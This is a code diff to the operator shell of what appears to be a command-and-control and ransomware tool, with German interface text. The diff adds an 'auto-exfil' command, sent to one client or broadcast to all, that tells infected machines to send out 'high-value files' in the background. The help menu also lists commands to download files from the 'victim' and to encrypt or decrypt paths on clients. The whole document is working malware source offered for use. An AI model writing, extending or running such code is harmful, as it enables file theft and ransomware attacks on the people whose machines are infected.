@@ -316,6 +316,12 @@ def server_shell():
                                 f"{Colors.WARNING}[*] Waiting for data transfer...{Colors.ENDC}"
                             )
 
+                        elif sub_cmd == "auto-exfil":
+                            send_command_to_client(cid, "auto-exfil")
+                            print(
+                                f"{Colors.WARNING}[*] Auto-Exfil gestartet auf Client {cid}. Hochwertige Dateien werden im Hintergrund exfiltriert...{Colors.ENDC}"
+                            )
+
                         elif sub_cmd.startswith("kill"):
                             kill_client(cid)
 
@@ -393,10 +399,32 @@ def server_shell():
                     broadcast_command("decrypt")
                     print("[+] Decrypt Befehl an alle Clients gesendet")
 
+                elif command == "auto-exfil":
+                    broadcast_command("auto-exfil")
+                    print(
+                        f"{Colors.WARNING}[+] Auto-Exfil Befehl an alle Clients gesendet{Colors.ENDC}"
+                    )
+
                 else:
                     broadcast_command(command)
             else:
                 print("[!] Usage: broadcast <command>")
+
+        elif cmd.startswith("auto-exfil "):
+            try:
+                parts = cmd.split(" ", 1)
+                if len(parts) != 2:
+                    print(f"{Colors.WARNING}[!] Usage: auto-exfil <client_id>{Colors.ENDC}")
+                else:
+                    cid = int(parts[1])
+                    send_command_to_client(cid, "auto-exfil")
+                    print(
+                        f"{Colors.WARNING}[*] Auto-Exfil gestartet auf Client {cid}. Hochwertige Dateien werden im Hintergrund exfiltriert...{Colors.ENDC}"
+                    )
+            except ValueError:
+                print("[!] Client ID muss eine Zahl sein")
+            except Exception as e:
+                print(f"[!] Error: {e}")
 
         elif cmd.startswith("exfil "):
             try:
@@ -422,7 +450,10 @@ def server_shell():
                 "  interact <id>               - Interagiere mit einem Client (Shell Mode)"
             )
             print(
-                f"  {Colors.BOLD}exfil <id> <remote_path>    - Lade Datei vom Opfer herunter (NEU!){Colors.ENDC}"
+                f"  {Colors.BOLD}exfil <id> <remote_path>    - Lade Datei vom Opfer herunter{Colors.ENDC}"
+            )
+            print(
+                f"  {Colors.BOLD}auto-exfil <id>             - Exfiltriere automatisch hochwertige Dateien{Colors.ENDC}"
             )
             print(
                 "  encrypt <id> <path>         - Verschlüssle Pfad auf spezifischem Client"
